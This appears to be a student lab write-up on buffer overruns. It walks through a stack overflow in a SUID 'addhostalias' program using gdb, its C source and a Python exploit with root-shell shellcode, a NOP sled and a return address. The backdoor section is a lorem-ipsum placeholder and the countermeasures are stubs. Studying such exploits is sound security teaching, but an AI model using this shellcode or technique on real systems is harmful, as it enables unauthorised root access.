# Language-based Security

## Lab 2 - Buffer Overruns

### Part 1 : Gaining root access

#### How it works ?

In order to gain root access to this machine, we are going to use the `addhostalias` executable file, which seems to be vulnerable to buffer overruns. In order to exploit this, we are going to go through several steps :
- analyse the vulnerability in the code
- use gdb to analyse how the program behave according to the arguments that we give to it
- find a way to exploit it, in our case we'll use Python which allow us to have our root shell more easily, since it's a high level language, we can focus on the content of our malicious code instead of how to generate it


Firstly let's have a brief explanation of how the stack works in this type of program. In order to maintain consistency during program execution, Linux OS stores in memory everything that is necessary for the program to works, that means it can push data in a stack, but also store address that point to other location memory (for example when a function call is performed). The schema below tries to summarize memory layout:

```
       0x11111111

   4 bytes (32bits OS)
< --------------------->


 ----------------------
|   RETURN ADRESS      | 
 ----------------------
|    BASE POINTER      |
 ---------------------- 
|                      |
|                      |
|                      |
|                      |
|                      |
|       STACK          |
|    (256 bytes)       |
|                      |
|                      |
|                      |
 ----------------------

       0x00000000

```


```c

#include <stdio.h>
#include <stdlib.h>
 
 
#define HOSTNAMELEN 256
#define IPADDR      1
#define HOSTNAME    2
#define ALIAS       3
 
#define HOSTFILE "/etc/hosts"
 
 
void add_alias(char *ip, char *hostname, char *alias) {
  char formatbuffer[256];
  FILE *file;
 
  sprintf(formatbuffer, "%s\t%s\t%s\n", ip, hostname, alias); // sprintf doesn't check if formatbuffer variable can be bound into 256 bytes, we are going to exploit this section
 
  file = fopen(HOSTFILE, "a");
  if (file == NULL) {
    perror("fopen");
    exit(EXIT_FAILURE);
  }
 
  fprintf(file, formatbuffer);
  if (fclose(file) != 0) {
    perror("close");
    exit(EXIT_FAILURE);
  }
}
 
 
int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Usage: %s ipaddress hostname alias \n", argv[0]);
    exit(EXIT_FAILURE);
  }
 
  add_alias(argv[IPADDR], argv[HOSTNAME], argv[ALIAS]);
  return(0);
}

```

Our goal is then to craft a python exploit that will allow us to fill buffer with malicious code, and overwrite the return address near this 

```python
# run a shell on local machine
shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
             +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
             +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
             +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
             +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
             +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
             +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')


# NOP signal, tells the CPU to go to the next instruction
nop = '\x90'
nops = nop*181

# estimated area of the end of the stack
nop_adress = '\x10\xf9\xff\xbf'

# 181 + 75 + 2 + 4 = 262 + 2 characters in printf = 264 bytes of data (instead of 256, so it will overwrite base pointer and return address)
print nops+shellcode,nop*2,nop_adress


```

#### How did we created our exploit ?


![How to use GDB to craft our exploit](/assets/lab2/gdb-demo.png)

- `gdb --args addhostalias $(python r00t.py)` entering debug mode for our program
- `(gdb) break fopen` place a break point to stop program execution when fopen function is called. In our case it will stop just after the buffer has been written to memory
- `(gdb) run` run the program until it finishes or that a breakpoint is reached
- `(gdb) x/100x $sp` display 100 current words in our memory where stack pointer is located, this allows us to analyse current stack state once our buffer is written with our three arguments


![Steps of our buffer overflow](/assets/lab2/buffer-overflow.png)


```

 ----------------------
|    RETURN ADRESS     | <------- now redirects approximately to the end of the stack
 ----------------------
|    BASE POINTER      | <------- not important in our case, but it's now overwritten with NOP operations
 ---------------------- 
|                      |
|       MALICIOUS      |
|         CODE         |
|                      |
|         ...          |
|         NOP          |
|         NOP          |
|         NOP          |
 ----------------------

```

The SUID bit is set so the program is vulnerable, because when a user run this program, its EUID (effective user id) it's the same as root, in order to have the possibility to edit /etc/hosts file, which root only has the right to write on it. The SUID bit is mandatory in this case in order to addhostalias to work properly.


`addhostalias $(python r00t.py)`

allow gaining root access using our python script





### Part 2 : Create a Backdoor

lorem ipsum

### Part 3 : Countermeasures

- Canaries : ...
- NX bit : ...
- ASLR : ...


### Sources that helped us gaining root access on the machine

1. [Buffer Overflow Attack, Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=589s)
2. [GDB Petit Tutoriel, Daniel Hirschkof](http://perso.ens-lyon.fr/daniel.hirschkoff/C_Caml/docs/doc_gdb.pdf)
3. [Le Débogueur GDB, Anne Canteaut](https://www.rocq.inria.fr/secret/Anne.Canteaut/COURS_C/gdb.html)






